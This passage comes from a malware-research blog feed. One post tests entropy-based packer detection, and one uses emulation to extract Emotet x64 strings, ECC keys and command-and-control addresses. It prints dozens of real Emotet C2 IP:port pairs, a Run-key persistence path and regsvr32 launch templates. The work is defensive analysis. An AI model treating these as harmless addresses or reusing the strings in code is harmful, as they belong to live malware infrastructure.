‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì ‚îÉ ‚îÉ ‚îÉ ‚îÉ ‚îÉ pe all ‚îÉ ‚îÉ ‚îÉ bin all ‚îÉ ‚îÉ ‚îÉ file ‚îÉ .NET ‚îÉ pe data ‚îÉ pe all ‚îÉ packed @ 7 ‚îÉ bin ave ‚îÉ bin all ‚îÉ packed @ 7 ‚îÉ bin t/f ‚îÉ ‚î°‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î© ‚îÇ 5b39d ‚îÇ True ‚îÇ 3.46 ‚îÇ 7.85 ‚îÇ True ‚îÇ 6.82 ‚îÇ 7.31 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ 2d83e ‚îÇ False ‚îÇ 7.98 ‚îÇ 7.98 ‚îÇ True ‚îÇ 6.87 ‚îÇ 7.34 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ 54fa2 ‚îÇ False ‚îÇ 2.85 ‚îÇ 7.95 ‚îÇ True ‚îÇ 6.86 ‚îÇ 7.28 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ eca1c ‚îÇ False ‚îÇ 7.89 ‚îÇ 7.89 ‚îÇ True ‚îÇ 6.07 ‚îÇ 7.30 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 8cb98 ‚îÇ False ‚îÇ 0.0 ‚îÇ 7.99 ‚îÇ True ‚îÇ 6.86 ‚îÇ 7.31 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ f2354 ‚îÇ True ‚îÇ 4.22 ‚îÇ 7.81 ‚îÇ True ‚îÇ 6.77 ‚îÇ 7.29 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ b9aba ‚îÇ False ‚îÇ 7.17 ‚îÇ 7.17 ‚îÇ True ‚îÇ 6.14 ‚îÇ 7.01 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ d5c2e ‚îÇ True ‚îÇ 2.65 ‚îÇ 7.85 ‚îÇ True ‚îÇ 6.28 ‚îÇ 7.31 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 3493e ‚îÇ True ‚îÇ 3.70 ‚îÇ 6.21 ‚îÇ False ‚îÇ 3.92 ‚îÇ 7.27 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 23b04 ‚îÇ False ‚îÇ 5.93 ‚îÇ 6.55 ‚îÇ False ‚îÇ 5.36 ‚îÇ 6.91 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 080f1 ‚îÇ False ‚îÇ 5.52 ‚îÇ 7.46 ‚îÇ True ‚îÇ 5.89 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ a7084 ‚îÇ True ‚îÇ 4.10 ‚îÇ 7.86 ‚îÇ True ‚îÇ 6.84 ‚îÇ 7.31 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ 60d89 ‚îÇ False ‚îÇ 5.25 ‚îÇ 7.77 ‚îÇ True ‚îÇ 5.71 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 35196 ‚îÇ False ‚îÇ 7.25 ‚îÇ 7.25 ‚îÇ True ‚îÇ 5.44 ‚îÇ 7.38 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ ff5ac ‚îÇ False ‚îÇ 5.39 ‚îÇ 7.69 ‚îÇ True ‚îÇ 6.26 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 3664a ‚îÇ True ‚îÇ 4.51 ‚îÇ 4.51 ‚îÇ False ‚îÇ 4.20 ‚îÇ 5.32 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 0d333 ‚îÇ False ‚îÇ 7.99 ‚îÇ 7.99 ‚îÇ True ‚îÇ 6.50 ‚îÇ 7.45 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 35196 ‚îÇ False ‚îÇ 7.25 ‚îÇ 7.25 ‚îÇ True ‚îÇ 5.44 ‚îÇ 7.38 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 31323 ‚îÇ False ‚îÇ 0 ‚îÇ 7.99 ‚îÇ True ‚îÇ 7.13 ‚îÇ 7.32 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ 44824 ‚îÇ False ‚îÇ 7.74 ‚îÇ 7.74 ‚îÇ True ‚îÇ 5.80 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 3d4f0 ‚îÇ True ‚îÇ 6.51 ‚îÇ 7.86 ‚îÇ True ‚îÇ 6.79 ‚îÇ 7.30 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ b707d ‚îÇ False ‚îÇ 0.0 ‚îÇ 6.45 ‚îÇ False ‚îÇ 5.37 ‚îÇ 7.42 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 6966f ‚îÇ False ‚îÇ 7.12 ‚îÇ 7.12 ‚îÇ True ‚îÇ 5.41 ‚îÇ 7.36 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 5139a ‚îÇ True ‚îÇ 2.39 ‚îÇ 7.87 ‚îÇ True ‚îÇ 6.82 ‚îÇ 7.35 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ 6e6e5 ‚îÇ True ‚îÇ 7.71 ‚îÇ 7.94 ‚îÇ True ‚îÇ 6.83 ‚îÇ 7.33 ‚îÇ True ‚îÇ True ‚îÇ ‚îÇ 0e4f3 ‚îÇ False ‚îÇ 7.80 ‚îÇ 7.80 ‚îÇ True ‚îÇ 6.01 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò . import os from rich.console import Console from rich.table import Table # assign directory directory = UNPACKED_DIR # iterate over files in # that directory table = Table(title=&quot;Unpacked Samples&quot;, expand=True) table.add_column(&quot;file&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;.NET&quot;, justify=&quot;center&quot;, no_wrap=True, ) table.add_column(&quot;pe data&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;pe all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin ave&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin all npacked @ 7&quot;, justify=&quot;center&quot;, no_wrap=True) table.add_column(&quot;bin t/f&quot;, justify=&quot;center&quot;, no_wrap=True) for filename in os.listdir(directory): f = os.path.join(directory, filename) # checking if it is a file if os.path.isfile(f): file_path = f pe_data = pe_test(file_path, all_sections=False) pe_all = pe_test(file_path, all_sections=True) bin_ave = bintropy_test(file_path, get_average=True) bin_all = bintropy_test(file_path, get_average=False) bin_tf = bintropy.bintropy(file_path) dotnet = is_dotnet(file_path) table.add_row(filename[:5], str(dotnet), str(pe_data)[:4], str(pe_all)[:4], str(True if pe_all &gt; 7 else False) , str(bin_ave)[:4], str(bin_all)[:4], str(True if bin_all &gt; 7 else False) , str(bin_tf)) console = Console() console.print(table) . Unpacked Samples ‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì ‚îÉ ‚îÉ ‚îÉ ‚îÉ ‚îÉ pe all ‚îÉ ‚îÉ ‚îÉ bin all ‚îÉ ‚îÉ ‚îÉ file ‚îÉ .NET ‚îÉ pe data ‚îÉ pe all ‚îÉ packed @ 7 ‚îÉ bin ave ‚îÉ bin all ‚îÉ packed @ 7 ‚îÉ bin t/f ‚îÉ ‚î°‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïá‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚î© ‚îÇ cf5f9 ‚îÇ True ‚îÇ 3.51 ‚îÇ 5.65 ‚îÇ False ‚îÇ 4.51 ‚îÇ 5.37 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 1b88e ‚îÇ False ‚îÇ 0 ‚îÇ 7.40 ‚îÇ True ‚îÇ 6.15 ‚îÇ 7.31 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 2333c ‚îÇ False ‚îÇ 6.69 ‚îÇ 6.69 ‚îÇ False ‚îÇ 5.28 ‚îÇ 6.34 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 7b277 ‚îÇ True ‚îÇ 0.00 ‚îÇ 1.81 ‚îÇ False ‚îÇ 6.04 ‚îÇ 7.30 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 2b3d3 ‚îÇ False ‚îÇ 5.04 ‚îÇ 6.18 ‚îÇ False ‚îÇ 5.06 ‚îÇ 6.15 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 967bd ‚îÇ False ‚îÇ 7.87 ‚îÇ 7.87 ‚îÇ True ‚îÇ 5.65 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 931a0 ‚îÇ False ‚îÇ 7.87 ‚îÇ 7.87 ‚îÇ True ‚îÇ 5.65 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 72f63 ‚îÇ False ‚îÇ 4.65 ‚îÇ 6.59 ‚îÇ False ‚îÇ 5.55 ‚îÇ 7.11 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ ee75b ‚îÇ False ‚îÇ 6.59 ‚îÇ 6.62 ‚îÇ False ‚îÇ 5.43 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 65be9 ‚îÇ False ‚îÇ 3.69 ‚îÇ 5.20 ‚îÇ False ‚îÇ 4.73 ‚îÇ 5.22 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 0f001 ‚îÇ False ‚îÇ 6.52 ‚îÇ 6.70 ‚îÇ False ‚îÇ 5.26 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ dc305 ‚îÇ False ‚îÇ 1.26 ‚îÇ 5.73 ‚îÇ False ‚îÇ 5.58 ‚îÇ 7.07 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 82c44 ‚îÇ False ‚îÇ 0 ‚îÇ 7.55 ‚îÇ True ‚îÇ 5.02 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 1d69f ‚îÇ False ‚îÇ 4.41 ‚îÇ 6.58 ‚îÇ False ‚îÇ 5.52 ‚îÇ 6.98 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ 75bae ‚îÇ False ‚îÇ 6.45 ‚îÇ 6.45 ‚îÇ False ‚îÇ 5.12 ‚îÇ 7.27 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ e8ad8 ‚îÇ False ‚îÇ 0 ‚îÇ 7.27 ‚îÇ True ‚îÇ 6.03 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 6057d ‚îÇ False ‚îÇ 5.05 ‚îÇ 5.99 ‚îÇ False ‚îÇ 5.07 ‚îÇ 5.86 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ ed6eb ‚îÇ True ‚îÇ 7.99 ‚îÇ 7.99 ‚îÇ True ‚îÇ 5.98 ‚îÇ 7.31 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 967bd ‚îÇ False ‚îÇ 7.87 ‚îÇ 7.87 ‚îÇ True ‚îÇ 5.65 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 443bb ‚îÇ False ‚îÇ 6.58 ‚îÇ 6.58 ‚îÇ False ‚îÇ 4.43 ‚îÇ 7.71 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 4076a ‚îÇ True ‚îÇ 4.88 ‚îÇ 5.52 ‚îÇ False ‚îÇ 4.22 ‚îÇ 5.65 ‚îÇ False ‚îÇ False ‚îÇ ‚îÇ f1c92 ‚îÇ False ‚îÇ 7.52 ‚îÇ 7.52 ‚îÇ True ‚îÇ 5.69 ‚îÇ 7.30 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 0a5cd ‚îÇ False ‚îÇ 6.65 ‚îÇ 6.65 ‚îÇ False ‚îÇ 5.40 ‚îÇ 7.79 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 0ffc3 ‚îÇ False ‚îÇ 0 ‚îÇ 7.41 ‚îÇ True ‚îÇ 6.15 ‚îÇ 7.32 ‚îÇ True ‚îÇ False ‚îÇ ‚îÇ 31a4d ‚îÇ False ‚îÇ 6.60 ‚îÇ 6.60 ‚îÇ False ‚îÇ 4.42 ‚îÇ 7.49 ‚îÇ True ‚îÇ False ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò . Conclusions . Entropy May Not Be Useful for .NET . For .NET in atleast one sample 3664a0db89a9f1a8bf439d8117943d3e042abe488a761dc6c8e18b90d6081298 which was packed had an entropy in the 4 range but when unpacked 2333c19020f6e928198cea31c05dd685055991c921f3a1cd32ad9817b6c704e6 the entropy was in the 6 range. From this we can conclude that entropy may have no relation to the packed status of a .NET binary. . Bintropy Has A Poor Packed Detection Rate with Default Values . For detecting packed samples using the default threashold the failure rate was 16/26, however there were no unpacked false positives. One conclusion we can draw from this is that the tool can the relied on when it detects a packed sample (ie, the sample is probably packed) but it cannot be relied on for a decision, as it has a high false negative rate. This could be used as a filter, but not as a decision metric. . General Conclusions . The results from our small &quot;pseudoscientific&quot; study do not match the results from the two academic papers refernced in our overview (99% and 97% accuracy). In our study we had a high fidelity when detecting packed sample (ie. if it was detected as packed it was in fact packed) however, we also have very high false negative rates (ie. if it was detected as not-packed there was an over 50% chance that it was actually packed). From this we can draw two conclusions, obviously the first, this was not a scientific study (more data needed) and the second, we cannot use entropy alone for packer identification, it must be combined with other metrics. .",
            "url": "https://research.openanalysis.net/research/entropy/unpacking/malware/2022/05/26/does-entropy-matter.html",
            "relUrl": "/research/entropy/unpacking/malware/2022/05/26/does-entropy-matter.html",
            "date": " ‚Ä¢ May 26, 2022"
        }
        
    
  
    
        ,"post48": {
            "title": "Emotet x64 Stack Strings Config Emulation",
            "content": "Overview . The week of May 9th, 2022 Emotet released an update to their x64 malware that used &quot;stack strings&quot; and an obfuscator to protect the strings, keys, and c2s. This was a change from the enrypted strings and c2 tables that were usually stored at the beginning of the .text and .data sections. Our new approach for config extraction will be to identify the functions used to supply the strings and c2s and emulate them. . Samples . packed: 92033dc85730f7dc5dbd85369ea1db8806ce7581c1e9b4764a82abfc54e3146e | unpacked: c688e079a16b3345c83a285ac2ae8dd48680298085421c225680f26ceae73eb7 | . Tools . Dumpulator minidump emulation github | . Using Dumpulator Emulation . from dumpulator import Dumpulator dp = Dumpulator(&quot;/tmp/emo2.dmp&quot;, quiet=True) . fn_addr_list = [0x07FFA3BA235D0, 0x7FFA3BA213C4,0x7FFA3BA21AAC,0x7FFA3BA2400C,0x7FFA3BA282D8,0x7FFA3BA2A36C,0x7FFA3BA2D370,0x7FFA3BA2DD3C,0x7FFA3BA2E468,0x7FFA3BA30C28,0x7FFA3BA31960,0x7FFA3BA33F28,0x7FFA3BA35980,0x7FFA3BA35B04,0x7FFA3BA3AFB0,0x7FFA3BA3F9A8,0x7FFA3BA3FEE8,0x7FFA3BA4012C,0x7FFA3BA41124,0x7FFA3BA412A4,0x7FFA3BA415A0,0x7FFA3BA42224,0x7FFA3BA43224,0x7FFA3BA44AEC,0x7FFA3BA465F0,0x7FFA3BA46744,0x7FFA3BA47140,0x7FFA3BA472A8,0x7FFA3BA490F8,0x7FFA3BA49850,0x7FFA3BA49A58,0x7FFA3BA49D04,0x7FFA3BA49FB4,0x7FFA3BA4BCB4,0x7FFA3BA4C168] for fn_addr in fn_addr_list: out = dp.call(fn_addr, []) ptxt_str = dp.read_str(out, encoding=&#39;utf-16&#39;) print(f&quot;{hex(fn_addr)}: {ptxt_str}&quot;) . 0x7ffa3ba235d0: %s%s.dll 0x7ffa3ba213c4: ObjectLength 0x7ffa3ba21aac: SOFTWARE Microsoft Windows CurrentVersion Run 0x7ffa3ba2400c: WinSta0 Default 0x7ffa3ba282d8: RNG 0x7ffa3ba2a36c: AES 0x7ffa3ba2d370: %s %s 0x7ffa3ba2dd3c: %s * 0x7ffa3ba2e468: SHA256 0x7ffa3ba30c28: %s %s 0x7ffa3ba31960: urlmon.dll 0x7ffa3ba33f28: advapi32.dll 0x7ffa3ba35980: %s:Zone.Identifier 0x7ffa3ba35b04: %s%s.exe 0x7ffa3ba3afb0: %s regsvr32.exe &#34;%s %s&#34; %s 0x7ffa3ba3f9a8: HASH 0x7ffa3ba3fee8: Microsoft Primitive Provider 0x7ffa3ba4012c: bcrypt.dll 0x7ffa3ba41124: ECDH_P256 0x7ffa3ba412a4: Cookie: %s=%s 0x7ffa3ba415a0: shlwapi.dll 0x7ffa3ba42224: shell32.dll 0x7ffa3ba43224: ECCPUBLICBLOB 0x7ffa3ba44aec: Content-Type: multipart/form-data; boundary=%s 0x7ffa3ba465f0: wininet.dll 0x7ffa3ba46744: ECDSA_P256 0x7ffa3ba47140: %s %s%x 0x7ffa3ba472a8: wtsapi32.dll 0x7ffa3ba490f8: POST 0x7ffa3ba49850: %s regsvr32.exe &#34;%s&#34; %s 0x7ffa3ba49a58: %s regsvr32.exe &#34;%s %s&#34; 0x7ffa3ba49d04: userenv.dll 0x7ffa3ba49fb4: %u.%u.%u.%u 0x7ffa3ba4bcb4: crypt32.dll 0x7ffa3ba4c168: KeyDataBlob . dp.read_str(out, encoding=&#39;utf-16&#39;) . &#39;%s%s.dll&#39; . import struct key_decrypt_functions = [0x7FFA3BA33B90, 0x7FFA3BA22048] for key_decrypt_function in key_decrypt_functions: tmp_arg = dp.allocate(8) out = dp.call(key_decrypt_function, [tmp_arg,tmp_arg, tmp_arg, tmp_arg]) key_header = bytes(dp.read(out, 8)) key_len = struct.unpack(&#39;&lt;I&#39;,key_header[4:8])[0] full_key_len = 8 + 2 * key_len key = bytes(dp.read(out, full_key_len)) print(key) . b&#39;ECK1 x00 x00 x00 xf3 xa35 xb5 x0e.+ xf45V xcd nL)&gt;| xf1 x10 xdd xcb xb0O xb3 xfa x02 xceL xb6 x0c x1eD x96 xbe xb4 x0e xe6 xc9[ x9a xbdN xbd x9d x8f xcf xe0 x10[4L x82 x04&amp; x02 xd3 xba xac xf1 xfb x9f,v&#39; b&#39;ECS1 x00 x00 x00@_t xb6 xc4 xd8 xdc x0c= x1f x06z7 xdc xb9 xf9 xb7 xbd^ x8a/ xa6 xa1 xf2 x0f xa1y r x14 xe5 xf51 xe8 xb0 n x1e&lt; x8b?{ x90 x1d&amp;&amp;1 x86e| x1a xad xd9 xc3 xacH xf0` x87 x18 xd9t&lt;X xf9&#39; . c2_fns = [0x07FFA3BA2E70C, 0x7FFA3BA30D88,0x7FFA3BA4B054,0x7FFA3BA21528,0x7FFA3BA4A4CC,0x7FFA3BA4C2B8,0x7FFA3BA4BF80,0x7FFA3BA4AA74,0x7FFA3BA2DAB0,0x7FFA3BA43584,0x7FFA3BA34644,0x7FFA3BA2FD58,0x7FFA3BA35690,0x7FFA3BA3975C,0x7FFA3BA23BD0,0x7FFA3BA3519C,0x7FFA3BA2B610,0x7FFA3BA4C8B0,0x7FFA3BA3C9F8,0x7FFA3BA36A10,0x7FFA3BA4339C,0x7FFA3BA21F58,0x7FFA3BA4557C,0x7FFA3BA28BC8,0x7FFA3BA3C5B4,0x7FFA3BA45498,0x7FFA3BA21000,0x7FFA3BA24E50,0x7FFA3BA2FBC4,0x7FFA3BA33278,0x7FFA3BA468C0,0x7FFA3BA464FC,0x7FFA3BA28EE0,0x7FFA3BA274A0,0x7FFA3BA3092C,0x7FFA3BA24D58,0x7FFA3BA3E274,0x7FFA3BA2BCF8,0x7FFA3BA4CAF8,0x7FFA3BA4A340,0x7FFA3BA29820,0x7FFA3BA4A0F8,0x7FFA3BA494D8,0x7FFA3BA35C7C,0x7FFA3BA3D5C8,0x7FFA3BA21D48,0x7FFA3BA4103C,0x7FFA3BA28DCC,0x7FFA3BA22F64,0x7FFA3BA301BC,0x7FFA3BA2F454,0x7FFA3BA2B9E4,0x7FFA3BA24C38,0x7FFA3BA3CF80,0x7FFA3BA3E360,0x7FFA3BA45264,0x7FFA3BA49C14,0x7FFA3BA469D0,0x7FFA3BA281E4,0x7FFA3BA2DC28,0x7FFA3BA26F38,0x7FFA3BA45678,0x7FFA3BA24868,0x7FFA3BA35598] def get_c2_from_fn(c2_fn): c2_ip = dp.allocate(4) c2_port = dp.allocate(4) ret = dp.call(c2_fn, [c2_ip, c2_port]) c2_port_bytes = dp.read(c2_port, 4) c2_port = struct.unpack(&#39;&lt;H&#39;,c2_port_bytes[2:4])[0] c2_ip_bytes = dp.read(c2_ip, 4) c2_ip = f&quot;{c2_ip_bytes[0]}.{c2_ip_bytes[1]}.{c2_ip_bytes[2]}.{c2_ip_bytes[3]}&quot; return f&quot;{c2_ip}:{c2_port}&quot; for c2_fn in c2_fns: c2 = get_c2_from_fn(c2_fn) print(f&quot;{c2}&quot;) . 172.104.251.154:8080 209.250.246.206:443 110.232.117.186:8080 164.68.99.3:8080 119.193.124.41:7080 212.237.17.99:8080 107.182.225.142:8080 185.8.212.130:7080 153.126.146.25:7080 77.81.247.144:8080 209.126.98.206:8080 201.94.166.162:443 131.100.24.231:80 45.235.8.30:8080 213.241.20.155:443 103.43.46.182:443 0.0.0.0:0 129.232.188.93:443 103.132.242.26:8080 151.106.112.196:8080 45.118.115.99:8080 185.4.135.165:8080 103.70.28.102:8080 51.91.7.5:8080 27.54.89.58:8080 196.218.30.83:443 206.189.28.199:8080 91.207.28.33:8080 79.137.35.198:8080 51.254.140.238:7080 173.212.193.249:8080 203.114.109.124:443 94.23.45.86:4143 63.142.250.212:443 189.126.111.200:7080 160.16.142.56:8080 102.222.215.74:443 5.9.116.246:8080 158.69.222.101:443 167.172.253.162:8080 82.165.152.127:8080 212.24.98.99:8080 197.242.150.244:8080 72.15.201.15:8080 101.50.0.91:8080 51.91.76.89:8080 183.111.227.137:8080 188.44.20.25:443 58.227.42.236:80 45.176.232.124:443 185.157.82.211:8080 163.44.196.120:8080 159.65.88.10:8080 146.59.226.45:443 1.234.2.232:8080 149.56.131.28:8080 209.97.163.214:443 46.55.222.11:443 150.95.66.124:8080 103.75.201.2:443 216.158.226.206:443 134.122.66.193:8080 1.234.21.73:7080 167.99.115.35:8080 . Automated Function Identification . Now that we have a way to extract the data from the functions using emulation all we need to do is create some regexes to indetify the functions and complete our automation. . import re import struct import pefile dump_image_base = 0x7FFA3BA20000 FILE_PATH = &#39;/tmp/emo_unpacked_1020000.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) egg = rb&#39; x48 x8D x05(....) x48 x89 x81.. x00 x00&#39; for m in re.finditer(egg, file_data): fn_rel_offset = struct.unpack(&#39;&lt;i&#39;, m.group(1))[0] inst_offset = m.start() fn_rva = pe.get_rva_from_offset(inst_offset) + 7 + fn_rel_offset fn_addr = dump_image_base + fn_rva c2 = get_c2_from_fn(fn_addr) print(f&quot;{hex(fn_addr)}: {c2}&quot;) . 0x7ffa3ba30d88: 209.250.246.206:443 0x7ffa3ba4b054: 110.232.117.186:8080 0x7ffa3ba21528: 164.68.99.3:8080 0x7ffa3ba4a4cc: 119.193.124.41:7080 0x7ffa3ba4c2b8: 212.237.17.99:8080 0x7ffa3ba4aa74: 185.8.212.130:7080 0x7ffa3ba2dab0: 153.126.146.25:7080 0x7ffa3ba43584: 77.81.247.144:8080 0x7ffa3ba34644: 209.126.98.206:8080 0x7ffa3ba2fd58: 201.94.166.162:443 0x7ffa3ba35690: 131.100.24.231:80 0x7ffa3ba3975c: 45.235.8.30:8080 